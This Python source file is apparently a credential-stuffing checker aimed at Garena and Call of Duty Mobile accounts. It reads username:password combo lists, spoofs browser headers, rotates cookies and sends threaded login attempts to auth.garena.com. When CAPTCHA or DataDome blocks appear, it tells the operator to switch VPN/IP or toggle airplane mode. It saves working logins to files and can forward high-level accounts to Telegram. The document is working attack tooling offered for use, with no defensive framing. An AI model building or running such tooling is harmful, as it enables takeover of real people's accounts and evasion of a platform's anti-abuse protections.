def load_cookie_pool():
    try:
        with open(COOKIE_FILE_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        pool = []
        for i, item in enumerate(raw):
            pool.append({
                "index": i + 1,
                "cookie": item,
                "headers": {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "status": "READY",
                "captcha_count": 0,
                "used": 0
            })
        return pool
    except Exception as e:
        print(f"{Fore.RED}❌ Failed to load cookie pool: {e}{Style.RESET_ALL}")
        return []

def log_cookie_status(index, username, status, message):
    with open("cookie_status_log.txt", "a", encoding="utf-8") as log:
        log.write(f"[{index}] {username} | {status.upper()} | {message}\n")

def show_cookie_pool_status(pool):
    total = len(pool)
    locked = sum(1 for c in pool if c["status"] == "LOCKED")
    usable = total - locked
    print(f"\n{Fore.CYAN}🔐 COOKIE POOL LOADED: {total} Total | {usable} Usable | {locked} Locked{Style.RESET_ALL}\n")

def animated_spinner(duration=3, message="🔁 Retrying..."):
    spinner = ['|', '/', '-', '\\']
    for i in range(duration * 4):
        sys.stdout.write(f"\r{Fore.YELLOW}{message} {spinner[i % len(spinner)]}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.25)
    print()

def check_account(username, password, date, overall_stats, send_telegram_notifications):
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        
        if cookies is None:
            overall_stats["CRITICAL_FAILURES"] += 1
            return "CRITICAL", f"{Fore.RED}[❌] FAILED TO LOAD COOKIES. Check your cookie source.{Style.RESET_ALL}"

        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        
        login_url = "https://auth.garena.com/api/prelogin"
        max_retries = 3
        retry_delay = 3
        response = None

        for attempt in range(1, max_retries + 1):
            print(f"{Fore.CYAN}[🔍] Sending PRELOGIN request to Garena for ➤ {Fore.CYAN}{username}{Style.RESET_ALL}")
            try:
                response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=10)
                break
            except (ConnectionError, Timeout, SSLError, RequestException) as e:
                error_text = str(e)
                if "HTTPConnectionPool" in error_text:
                    print(f"{Fore.MAGENTA}[🌐] HTTPConnectionPool issue detected! {error_text}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[🔌] CONNECTION ERROR: {error_text}{Style.RESET_ALL}")

                if attempt < max_retries:
                    animated_spinner(retry_delay, f"🔁 Retrying PRELOGIN {attempt}/{max_retries}")
                else:
                    print(f"{Fore.RED}[🛑] Max retries reached! Please fix your VPN or connection.{Style.RESET_ALL}")
                    overall_stats["OTHER_FAILED"] += 1
                    return "FAILED", f"{Fore.RED}🔌 CONNECTION FAILED after {max_retries} retries.{Style.RESET_ALL}"
        
        if response is None:
            overall_stats["OTHER_FAILED"] += 1
            return "FAILED", f"{Fore.RED}[❌] No response received from Garena PRELOGIN.{Style.RESET_ALL}"

        if "captcha" in response.text.lower() or "datadome" in response.text.lower() or response.status_code == 403:
            print(f"{Fore.RED}[🛑] CAPTCHA Triggered! {Style.RESET_ALL}Your cookies or IP may be flagged during PRELOGIN.")
            return "CAPTCHA", "🛑 CAPTCHA DETECTED. COOKIES EXPIRED OR BLOCKED."

        if response.status_code == 200:
            try:
                data = response.json()
                if data is None:
                    overall_stats["OTHER_FAILED"] += 1
                    return "FAILED", f"{Fore.RED}[❌] PRELOGIN API returned an empty/null response.{Style.RESET_ALL}"
            except json.JSONDecodeError:
                overall_stats["OTHER_FAILED"] += 1
                return "FAILED", f"{Fore.RED}[❌] Failed to decode JSON from PRELOGIN response.{Style.RESET_ALL}"

            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                overall_stats["NOT_FOUND_OR_BAD_PAYLOAD"] += 1
                return "FAILED", f"{Fore.RED}[❌] ACCOUNT NOT FOUND OR BAD PAYLOAD{Style.RESET_ALL}"

            encrypted_password = encrypt_password(password, v1, v2)

            if "error" in data or data.get("error_code"):
                error_detail = data.get("error", "Unknown error in prelogin")
                overall_stats["OTHER_FAILED"] += 1
                return "FAILED", f"{Fore.RED}[❌] PRELOGIN API Error: {error_detail}{Style.RESET_ALL}"

            result_status_from_login = check_login(
                username, random_id, encrypted_password,
                password, headers, cookies, cookies.get('datadome'), date,
                codm_banned=False, shared_stats=overall_stats,
                send_telegram_notifications=send_telegram_notifications
            )
            
            if result_status_from_login == "SUCCESSFUL_CHECK":
                return "SUCCESS", "Account checked successfully."
            elif "banned" in result_status_from_login.lower():
                overall_stats["OTHER_FAILED"] += 1 
                return "FAILED", f"{Fore.YELLOW}[⛔] Account is banned!{Style.RESET_ALL}"
            elif "failed to retrieve codm data" in result_status_from_login.lower():
                return "FAILED", result_status_from_login
            elif "General Login Failure" in result_status_from_login.lower():
                return "FAILED", result_status_from_login
            elif "captcha blocked" in result_status_from_login.lower():
                return "CAPTCHA", result_status_from_login
            else:
                overall_stats["OTHER_FAILED"] += 1
                return "FAILED", result_status_from_login
                
        else:
            overall_stats["OTHER_FAILED"] += 1
            return "FAILED", f"{Fore.RED}[❌] HTTP Error during PRELOGIN: {response.status_code}{Style.RESET_ALL}"

    except Exception as e:
        overall_stats["OTHER_FAILED"] += 1
        return "FAILED", f"{Fore.RED}[⚠️ EXCEPTION in check_account] {str(e)}{Style.RESET_ALL}"
        
def get_request_data():
    cookies = change_cookie.get_cookies()
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    return cookies, headers  

from requests.exceptions import ConnectionError, Timeout, SSLError, RequestException
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

RESET = '\033[0m'
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'

THREAD_DELAYS = {
    1: (1, 1),
    2: (2, 0.5),
    3: (3, 0.2),
    4: (5, 0.1),
}

def type_out(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def fancy_bar(current, total, bar_length=30):
    if total == 0:
        return "[------------------------------] 0.0%"
    filled = int(bar_length * current // total)
    bar = '█' * filled + '-' * (bar_length - filled)
    percent = (current / total) * 100
    return f"[{bar}] {percent:.1f}%"

def hacker_progress_bar(message):
    for i in range(21):
        bar = fancy_bar(i, 20)
        sys.stdout.write(f"\r{YELLOW}{message} {bar}{RESET}")
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def get_datenow():
    return time.strftime("%Y%m%d_%H%M%S")

def select_threading_speed():
    print(f"""
{CYAN}⚙️  THREADING SPEED MENU
----------------------------
🐢 Slow     → 1 Thread, 1s Delay
⚖️  Medium   → 2 Threads, 0.5s Delay
⚡ Fast     → 3 Threads, 0.2s Delay
🚀 Ultra    → 5 Threads, 0.1s Delay{RESET}
""")
    speed_map = {"slow": 1, "medium": 2, "fast": 3, "ultra": 4}
    while True:
        choice = input(f"🔧 Select speed [slow / medium / fast / ultra]: ").strip().lower()
        if choice in speed_map:
            threads, delay_val = THREAD_DELAYS[speed_map[choice]]
            print(f"\n🧠 Setting up environment...")
            hacker_progress_bar("🛠️ Initializing Mode")
            print(f"{GREEN}✅ Mode Ready: {threads} thread(s), {delay_val}s delay{RESET}\n")
            return threads, delay_val
        else:
            print(f"{RED}❌ Invalid input. Please choose a valid mode.{RESET}")

def print_live_scan_summary(stats, total_accounts):
    def pct(part):
        return f"{(part / stats['TOTAL_PROCESSED'] * 100):.1f}%" if stats['TOTAL_PROCESSED'] else "0.0%"
    
    print(f"""
{BLUE}📊 [ LIVE SCAN SUMMARY ]{RESET}
──────────────────────────────────────────────
{CYAN}🔢 Checked Accounts            : {stats['TOTAL_PROCESSED']}/{total_accounts}{RESET}
{GREEN}🎯 Successful Logins           : {stats['SUCCESS']} ({pct(stats['SUCCESS'])}){RESET}
{YELLOW}❓ Failed CODM Data            : {stats['FAILED_CODM_DATA']} ({pct(stats['FAILED_CODM_DATA'])}){RESET}
{RED}❌ Incorrect Credentials       : {stats['INCORRECT_CREDENTIALS']} ({pct(stats['INCORRECT_CREDENTIALS'])}){RESET}
{RED}❌ Not Found / Bad Payload     : {stats['NOT_FOUND_OR_BAD_PAYLOAD']} ({pct(stats['NOT_FOUND_OR_BAD_PAYLOAD'])}){RESET}
{RED}🛑 Critical Errors             : {stats['CRITICAL_FAILURES']} ({pct(stats['CRITICAL_FAILURES'])}){RESET}
{YELLOW}🔐 CAPTCHA Triggered           : {stats['CAPTCHA_DETECTED']} ({pct(stats['CAPTCHA_DETECTED'])}){RESET}
{GREEN}🧼 Clean Accounts              : {stats['CLEAN']} ({pct(stats['CLEAN'])}){RESET}
{YELLOW}🧪 Not Clean Accounts          : {stats['NOT_CLEAN']} ({pct(stats['NOT_CLEAN'])}){RESET}
""")

def bulk_check(lines, file_path, send_telegram_notifications):
    threads, delay = select_threading_speed()
    date = get_datenow()

    overall_stats = {
        "SUCCESS": 0, "CAPTCHA_DETECTED": 0, "CLEAN": 0, "NOT_CLEAN": 0,
        "INCORRECT_CREDENTIALS": 0, "FAILED_CODM_DATA": 0, "NOT_FOUND_OR_BAD_PAYLOAD": 0,
        "CRITICAL_FAILURES": 0, "OTHER_FAILED": 0, "TOTAL_PROCESSED": 0
    }

    captcha_triggered_accounts = set()

    output_dir = "ZEN1"
    os.makedirs(output_dir, exist_ok=True)
    
    accounts_to_run = [acc.strip() for acc in lines if acc.strip()]
    total_accounts = len(accounts_to_run)

    success_file = os.path.join(output_dir, f"valid_accounts_{date}.txt")
    failed_file = os.path.join(output_dir, f"failed_accounts_{date}.txt")

    print(f"\n🚨 SCAN STARTED - TARGET LOCKED 🔍")
    print(f"📄 File Loaded     : {file_path}")
    print(f"🛠️ Threads        : {threads}")
    print(f"⏲️ Delay/Thread   : {delay} sec")
    print(f"📦 Accounts Loaded : {total_accounts}\n")
    time.sleep(1)

    start_time = time.time()

    def check_wrapper(acc):
        if ':' not in acc or len(acc.split(':')) < 2:
            overall_stats["OTHER_FAILED"] += 1
            return (acc, "FAILED", "Invalid format: username:password expected.")
        parts = acc.split(':')
        username, password = parts[-2], parts[-1]
        
        status, message = check_account(username, password, date, overall_stats, send_telegram_notifications) 
        time.sleep(delay)
        return (f"{username}:{password}", status, message)

    processed_in_batch = set()

    while accounts_to_run:
        captcha_hit = False
        batch_to_check = accounts_to_run[:]
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor, \
                 open(success_file, 'a', encoding='utf-8') as success_out, \
                 open(failed_file, 'a', encoding='utf-8') as failed_out:

                futures = {executor.submit(check_wrapper, acc): acc for acc in batch_to_check}
                
                for future in as_completed(futures):
                    original_account_line = futures[future]
                    processed_in_batch.add(original_account_line)

                    acc, status, message = future.result()
                    
                    if ':' in acc:
                        username, password = acc.split(':', 1)
                    else:
                        username, password = acc, ''

                    print(f"\n🔍 [{overall_stats['TOTAL_PROCESSED']+1}/{total_accounts}] Checking {username} {fancy_bar(overall_stats['TOTAL_PROCESSED']+1, total_accounts)}")
                    
                    if status == "CAPTCHA":
                        captcha_hit = True
                        
                        if acc not in captcha_triggered_accounts:
                            overall_stats['CAPTCHA_DETECTED'] += 1
                            captcha_triggered_accounts.add(acc)

                        failed_out.write(f"{acc} - PAUSED_FOR_CAPTCHA\n")
                        for f in futures:
                            f.cancel()
                        break
                    
                    overall_stats['TOTAL_PROCESSED'] += 1

                    if status == "CRITICAL":
                        print(f"{RED}CRITICAL FAILURE: {message}{RESET}")
                        failed_out.write(f"{acc} - CRITICAL FAILURE: {message}\n")
                        accounts_to_run = []
                        captcha_hit = False
                        break

                    elif status == "SUCCESS":
                        success_out.write(f"{username}:{password} - valid\n")
                        print(f"✅ Login successful for {username}. Report printed above.")
                    
                    elif status == "FAILED":
                        print(f"❌ FAILED: {username} - {message}")
                        failed_out.write(f"{acc} - FAILED: {message}\n")

                    print_live_scan_summary(overall_stats, total_accounts)
                    time.sleep(0.2)

        except Exception as e:
            print(f"⚠️ An unexpected error occurred in the bulk checker: {e}")
            import traceback
            traceback.print_exc()

        if captcha_hit:
            accounts_to_run = [acc for acc in batch_to_check if acc not in processed_in_batch]
            
            print(f"\n{RED}===================[ 🛑 SCAN PAUSED 🛑 ]===================")
            print(f"{YELLOW}Garena is blocking requests. The scan has been paused.")
            print_live_scan_summary(overall_stats, total_accounts)
            print(f"{CYAN}Account that triggered the block: {username}")
            print(f"ACTION REQUIRED: Please change your VPN/IP or toggle Airplane Mode now.")
            input(f"{GREEN}Once you have a new IP, press ENTER to resume the scan...{RESET}")
            print(f"{YELLOW}Resuming scan with {len(accounts_to_run)} remaining accounts... please wait.{RESET}\n")
            processed_in_batch.clear()
        else:
            accounts_to_run = []

    end_time = time.time()
    total_time = end_time - start_time
    accounts_per_minute = overall_stats['TOTAL_PROCESSED'] / (total_time / 60) if total_time > 0 else 0

    print("\n📊 FINAL SCAN SUMMARY")
    print(f"🔢 Total Checked      : {overall_stats['TOTAL_PROCESSED']}")
    print(f"🎯 Successful Logins  : {overall_stats['SUCCESS']}")
    print(f"🛑 Critical Errors    : {overall_stats['CRITICAL_FAILURES']}")
    print(f"🔐 CAPTCHA Triggered  : {overall_stats['CAPTCHA_DETECTED']}")
    print(f"🧼 Clean Accounts     : {overall_stats['CLEAN']}")
    print(f"🧪 Not Clean Accounts : {overall_stats['NOT_CLEAN']}")
    print(f"⚡ Speed              : {accounts_per_minute:.2f} acc/min")

    print("\n💾 Results Saved To:")
    print(f"  ✅ Valid    : {success_file}")
    print(f"  ❌ Failed   : {failed_file}") 

    actual_fails_for_chunk_summary = overall_stats['INCORRECT_CREDENTIALS'] + \
                                     overall_stats['FAILED_CODM_DATA'] + \
                                     overall_stats['NOT_FOUND_OR_BAD_PAYLOAD'] + \
                                     overall_stats['OTHER_FAILED']
                                     
    return overall_stats['SUCCESS'], actual_fails_for_chunk_summary, overall_stats['TOTAL_PROCESSED'], overall_stats['CAPTCHA_DETECTED']

import os
import sys
import time

YELLOW = '\033[93m'
RESET = '\033[0m'
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'

def slow_type(text, speed=0.02):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def progress_bar(task_name, duration=2):
    bar_length = 30
    for i in range(bar_length + 1):
        percent = int((i / bar_length) * 100)
        bar = '█' * i + '-' * (bar_length - i)
        sys.stdout.write(f'\r🔧 {task_name}: |{bar}| {percent}%')
        sys.stdout.flush()
        time.sleep(duration / bar_length)
    print()

def access_granted_animation():
    stages = [
        "🛑 SYSTEM LOCKED...",
        "🔓 BYPASSING FIREWALL...",
        "📡 SIGNAL STABILIZED...",
        "✅ ACCESS GRANTED"
    ]
    for stage in stages:
        slow_type(stage, 0.04)
        time.sleep(0.5)
    progress_bar("EXECUTING SCAN PROTOCOL", 2)
    print()

def countdown_bar(seconds=3, label="⏳ Waiting before next scan"):
    bar_length = 30
    for i in range(seconds * 10 + 1):
        percent = int((i / (seconds * 10)) * 100)
        bar_filled = int((i / (seconds * 10)) * bar_length)
        bar = '█' * bar_filled + '-' * (bar_length - bar_filled)
        sys.stdout.write(f'\r{label}: |{bar}| {percent:>3}%')
        sys.stdout.flush()
        time.sleep(0.1)
    print()

def select_combo_folder():
    base_path = "/storage/emulated/0/kenze_panel/checker_combos/"
    while True:
        print("📁 Select Source Directory:")
        print("  [1] /Elite/Combo")
        print("  [2] /Elite/PRIVATE")
        print("  [3] /Elite/NewULP 🚀")
        print("  [4] Custom Subfolder")
        print("  [KUPAL] Go back / Cancel")

        choice = input("\n🧩 Enter option [1 / 2 / 3 / 4 / KUPAL]: ").strip().lower()

        if choice == '1':
            return os.path.join(base_path, "Combo")
        elif choice == '2':
            return os.path.join(base_path, "PRIVATE")
        elif choice == '3':
            return os.path.join(base_path, "NewULP")
        elif choice == '4':
            subfolder = input("📂 Enter subfolder name (or type KUPAL to go back): ").strip()
            if subfolder.lower() == 'kupal':
                continue
            return os.path.join(base_path, subfolder)
        elif choice == 'kupal':
            print("\n❌ Cancelled. Going back.\n")
            return None
        else:
            print("⚠️ Invalid option. Please try again.\n")

def find_nearest_account_file(search_dir):
    keywords = ["garena", "account", "codm"]
    for root, _, files in os.walk(search_dir):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    return os.path.join(search_dir, "accounts.txt")

def list_combo_files(combo_folder):
    files_info = []
    if not os.path.isdir(combo_folder):
        print(f"[!] Folder not found: {combo_folder}\n")
        return files_info

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
    for filename in txt_files:
        path = os.path.join(combo_folder, filename)
        try:
            size_kb = os.path.getsize(path) / 1024
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = sum(1 for _ in f)
            files_info.append((filename, size_kb, lines, path))
        except Exception as e:
            print(f"[!] Failed to read {filename}: {e}")
    return files_info

def choose_file_from_combo(combo_folder, used_file=None):
    files_info = list_combo_files(combo_folder)
    if not files_info:
        return None

    print("\n📂 Available Combo Files:")
    print(f"{'No.':<4} {'Filename':<30} {'Size(KB)':>10} {'Lines':>8} {'Status':>10}")
    print("-" * 70)

    for idx, (fname, size, lines_count, path) in enumerate(files_info, start=1):
        status = "[USED]" if used_file and os.path.abspath(path) == os.path.abspath(used_file) else "[READY]"
        print(f"{idx:<4} {fname:<30} {size:10.2f} {lines_count:8} {status:>10}")

    while True:
        choice = input("\n🧭 Select file number or type KUPAL to go back: ").strip().lower()
        if choice == 'kupal':
            return 'KUPAL'
        if choice.isdigit():
            choice_num = int(choice)
            if 1 <= choice_num <= len(files_info):
                selected_file = files_info[choice_num - 1][3]
                print(f"\n✅ Selected: {files_info[choice_num - 1][0]}")
                return selected_file
        print("⚠️ Invalid input. Please try again.")

def draw_bar(label, percent, width=30):
    filled = int(width * percent / 100)
    bar = '■' * filled + '-' * (width - filled)
    print(f"{label} [{bar}] {percent:.1f}%")

def taeee(jarell):
    print("\n🔗 INITIATING PAYLOAD SOURCE SELECTION...\n")
    
    send_telegram_notifications = False
    telegram_choice = input(f"\n{YELLOW}🤖 Do you want to send notifications to Telegram for accounts level 150+? (y/n): {RESET}").strip().lower()
    if telegram_choice == 'y':
        if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN or "YOUR_CHAT_ID" in TELEGRAM_CHAT_ID:
            print(f"{RED}❌ Cannot enable Telegram notifications. Please configure your BOT_TOKEN and CHAT_ID at the top of the script.{RESET}")
        else:
            send_telegram_notifications = True
            print(f"{GREEN}✅ Telegram notifications ENABLED.{RESET}")
    else:
        print(f"{YELLOW}☑️ Telegram notifications DISABLED.{RESET}")
    
    combo_folder = select_combo_folder()
    if not combo_folder:
        return

    progress_bar("🔎 SCANNING FOLDER", 1.5)
    used_file = find_nearest_account_file(combo_folder)
    file_path = choose_file_from_combo(combo_folder, used_file=used_file)

    if file_path == 'KUPAL' or not file_path:
        return

    if not os.path.isfile(file_path):
        print("\n❌ No valid file found. Exiting scan.\n")
        return

    dedup_choice = input(f"\n{YELLOW}🧹 Do you want to remove duplicate lines from the file before scanning? (y/n): {RESET}").strip().lower()
    if dedup_choice == 'y':
        print(f"\n{CYAN}🔄 Cleaning file: {os.path.basename(file_path)}...{RESET}")
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            original_count = len(lines)
            
            unique_lines = list(dict.fromkeys(lines))
            new_count = len(unique_lines)
            
            duplicates_removed = original_count - new_count
            
            if duplicates_removed > 0:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.writelines(unique_lines)
                print(f"{GREEN}✅ File cleaned successfully!{RESET}")
                print(f"   - Original lines: {original_count}")
                print(f"   - Duplicates removed: {duplicates_removed}")
                print(f"   - Remaining lines: {new_count}")
            else:
                print(f"{GREEN}✅ No duplicate lines found. File is already clean.{RESET}")

        except Exception as e:
            print(f"{RED}❌ Error during deduplication: {e}{RESET}")
    else:
        print(f"\n{YELLOW}⏭️  Skipping duplicate removal.{RESET}")


    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            original_lines = f.readlines()
    except Exception as e:
        print(f"\n{RED}❌ Failed to read the combo file: {e}{RESET}")
        return

    progress_file = file_path + ".progress"
    resume_index = 0

    if os.path.exists(progress_file):
        with open(progress_file, 'r') as pf:
            try:
                resume_index = int(pf.read().strip())
                print(f"\n⚠️ Detected previous incomplete scan at line {resume_index}.")
                resume_choice = input("🔄 Do you want to resume from last scanned line? (y/n): ").strip().lower()
                if resume_choice != 'y':
                    resume_index = 0
                    if os.path.exists(progress_file):
                        os.remove(progress_file)
            except (ValueError, IndexError):
                resume_index = 0

    all_lines = original_lines[resume_index:]
    print(f"\n📊 Total lines found: {len(all_lines)}")
    
    chunks = []
    for i in range(1, 4):
        raw = input(f"📌 Enter number of lines to scan for chunk {i} (or press ENTER to skip): ").strip()
        if raw == "":
            chunks.append(0)
        else:
            try:
                num = int(raw)
                if num > len(all_lines):
                    num = len(all_lines)
                chunks.append(num)
            except ValueError:
                print("⚠️ Invalid input. Skipping this chunk.")
                chunks.append(0)

    overall_hits = 0
    overall_fails = 0
    overall_captchas = 0
    overall_critical_failures = 0
    total_processed_for_progress = 0

    for i, count in enumerate(chunks):
        if count <= 0 or not all_lines:
            continue
        
        current_lines_for_chunk = all_lines[:count]
        print(f"\n📦 Starting scan batch {i+1}... ({len(current_lines_for_chunk)} lines)")

        if i == 0:
            input("🕹️ Press ENTER to launch scan...")
        else:
            countdown_bar(seconds=3)

        access_granted_animation()

        hits_chunk, fails_chunk, total_chunk_processed, captchas_chunk = bulk_check(current_lines_for_chunk, file_path, send_telegram_notifications)
        
        overall_hits += hits_chunk
        overall_fails += fails_chunk
        overall_captchas += captchas_chunk
        
        hit_percent = (hits_chunk / total_chunk_processed * 100) if total_chunk_processed else 0
        fail_percent = (fails_chunk / total_chunk_processed * 100) if total_chunk_processed else 0
        captcha_percent = (captchas_chunk / total_chunk_processed * 100) if total_chunk_processed else 0

        print(f"\n📊 Chunk {i+1} Results:")
        draw_bar("   ✅ HIT RATE    ", hit_percent)
        draw_bar("   ❌ FAIL RATE   ", fail_percent)
        draw_bar("   🤖 CAPTCHA RATE", captcha_percent)
        print(f"   📈 Total Scanned : {total_chunk_processed}\n")

        total_processed_for_progress += len(current_lines_for_chunk)
        all_lines = all_lines[count:]
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(all_lines)
        print(f"🧹 Removed {count} scanned lines from original file ✅")
        
        with open(progress_file, 'w') as pf:
            pf.write(str(resume_index + total_processed_for_progress))

    total_checked_overall = sum(chunks)
    
    hit_rate_final = (overall_hits / total_checked_overall * 100) if total_checked_overall else 0
    fail_rate_final = (overall_fails / total_checked_overall * 100) if total_checked_overall else 0
    captcha_rate_final = (overall_captchas / total_checked_overall * 100) if total_checked_overall else 0


    print(f"\n{YELLOW}╔═════════════════════════════════════════════╗")
    print(f"║                📊 FINAL STATS               ║")
    print(f"╠═════════════════════════════════════════════╣")
    print(f"║ 🔍 TOTAL CHECKED        : {total_checked_overall:<20}║")
    print(f"║ ✅ TOTAL HITS           : {overall_hits:<5} ({hit_rate_final:.1f}%)        ║")
    print(f"║ ❌ TOTAL FAILS          : {overall_fails:<5} ({fail_rate_final:.1f}%)        ║")
    print(f"║ 🤖 TOTAL CAPTCHA FOUND  : {overall_captchas:<5} ({captcha_rate_final:.1f}%)        ║")
    print(f"║ 📉 REMAINING IN FILE    : {len(all_lines):<20}║")
    print(f"╚═════════════════════════════════════════════╝{RESET}\n")

    if os.path.exists(progress_file):
        os.remove(progress_file)
        print("✅ Cleared scan progress file.")


import os
import sys
import time
import shutil
import platform
import psutil
import requests
from datetime import datetime
from colorama import Fore, init

init(autoreset=True)

class Colors:
    _is_supported = sys.stdout.isatty()
    RESET = '\033[0m' if _is_supported else ''
    CYAN = '\033[96m' if _is_supported else ''
    GREEN = '\033[92m' if _is_supported else ''
    YELLOW = '\033[93m' if _is_supported else ''
    BOLD = '\033[1m' if _is_supported else ''
    MAGENTA = '\033[95m' if _is_supported else ''
    BLACK = '\033[30m' if _is_supported else ''

try:
    TERMINAL_WIDTH = shutil.get_terminal_size().columns
except OSError:
    TERMINAL_WIDTH = 80

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unavailable"

def rotate_logs(folder="ZEN_LOGS", keep_days=7):
    if not os.path.exists(folder):
        return
    now = time.time()
    for filename in os.listdir(folder):
        filepath = os.path.join(folder, filename)
        if os.path.isfile(filepath) and os.path.getmtime(filepath) < now - keep_days * 86400:
            try:
                os.remove(filepath)
            except OSError:
                pass

def typeout(text, delay=0.001):
    for char in text.center(TERMINAL_WIDTH):
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def boot_progress(stage, delay=1.5):
    bar_length = 30
    spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    for i in range(bar_length + 1):
        bar_fill = "█" * i
        bar_empty = '─' * (bar_length - i)
        percent = f"{int((i / bar_length) * 100)}%".rjust(4)
        spinner = spinner_chars[i % len(spinner_chars)]
        
        line = (f"\r {Colors.CYAN}{spinner}{Colors.RESET} {stage.ljust(30)} "
                f"[{Colors.GREEN}{bar_fill}{Colors.CYAN}{bar_empty}{Colors.RESET}] {percent}")
        
        sys.stdout.write(line)
        sys.stdout.flush()
        time.sleep(delay / bar_length)
    
    done_line = f"\r {Colors.GREEN}✓{Colors.RESET} {stage.ljust(30)} [{'█' * bar_length}] 100% \n"
    sys.stdout.write(done_line)
    sys.stdout.flush()

def print_header(title, color=Colors.CYAN):
    title_text = f" [ {title} ] "
    dashes_len = (TERMINAL_WIDTH - len(title_text)) // 2
    dashes = "─" * dashes_len
    print(f"\n{color}{dashes}{Colors.BOLD}{title_text}{Colors.RESET}{color}{dashes}{Colors.RESET}")

def main():
    boot_start = time.time()
    clear_screen()

    banner = """
.r 
....................................................................................................
....................................................................................................
...............................................::..::...............................................
..............................::...:..........:. .: .::.........::...:..............................
.............................:. :~  ::...::...   !7   .:::....::. ^^ .:.............................
............................::  ^P.  ...... .:^~!YY!~^:........   5!  :.............................
............................::  !P:         .:^~!JY!~^:.         .P?  .:............................
............................^. .5P.             .??. ..           5P:  :............................
............................:  7G5            .^^!!~^..           JG7  ::...........................
...........................:.  JBY         .:^^^.^::^:^^.         ?BJ. .:...........................
...........................:.  7PG^        :^..:^::!^..^~        :PP?. .:...........................
............................:  :JGP!.      ::^:!^^^~~:::~      .~PGY: .:............................
.............................:  :75P5Y?~:.  ^!^!^!7!::!!.  :~?YPGPJ^  :.............................
.............................::   ^!?5PBBPJ7~^^^^~~^:^~~7J5GBGPY!^.  ::.............................
..............................^.    :~~!?PBG5^...~~.. :YBBPJ7~~:     ^..............................
.............................::  .^~^:  .^?PGGY:.~~..JGBBJ~: .:^~^.  ::.............................
...........................::. :~~:. .:^:.:75PBY.~~.JBGPJ:.:^:...:~~: .::...........................
..........................:. .~~: .:^::::. .Y5GBPPGGBGG5^ .::^:^:. :~~. .:..........................
........................::. ^!: .:~^..^777JYPGBBBBBBBBG5YJ777^..:~^  ^!: .::........................
.......................::  ~!. :^:::.:.:!~7Y?5BBBBBBBBP757~7:.:.:::^: .!~  ::.......................
.......................:  ^!. :^.. :.:~!77!:~PBBBBBBBBG!:!77!^:.:...^: .!^  ^.......................
......................:. :!. :~..  .:.^~^~~:!~~PBBBBP!!!:^~^~^...  ..~: .!: ::......................
......................:  !^  ~.:     ^^:^:^7^?7?BBBBJ7?^J~.:::^.    :.~  ^!  ^......................
.....................:. .!. :^..    ::^:. ?!: 7PPBBGGJ.^7Y...^::    ..^: .!: .::....................
...................::.  :!  ^::    .~:^  ~Y^?..JPBBGY: J~Y~  ^:~.    ..~  7:   ::...................
...................:. .:~7::!^~:: .7!~~:.?~77:^^Y5PJ!:.7?~J::^~!7: ::^^!::7~:.  :...................
....................:.  :!. ^::  ...~.^ ~J^?:.! !YY!.!..7!J! ^:^.    ::^ .!:  .:....................
.....................:.  !^ .~...:^^::^?!7~Y. J~ :: ~?..?!!7?~.: :::..~. :!. .:.....................
......................^  ^!. ^^.. ^. ~??~~!7~.Y7.^^.7J.!77~^??~ .:...:^ .!^ .^......................
......................^   ~~  ^^...^7?J^~~!!!.77^77^!!.7!7^!~?J?:...:^  ~~  .^......................
.....................::    ~~. :^^77?5?^..!?~ 77.77^~! !?7:.~?J?Y7~^~  ~~.   ::.....................
....................:.   .  ^~^^7J7?J7Y~ :7!^ ^?:!7:J: :^7: ~YJ?7JJ7~^~~. ..  ::....................
...................:.  ::~~~~7???77??!J:~^?!.:^Y:~7^J^:.!?^~:J77???7?7!~~~^:.  .::..................
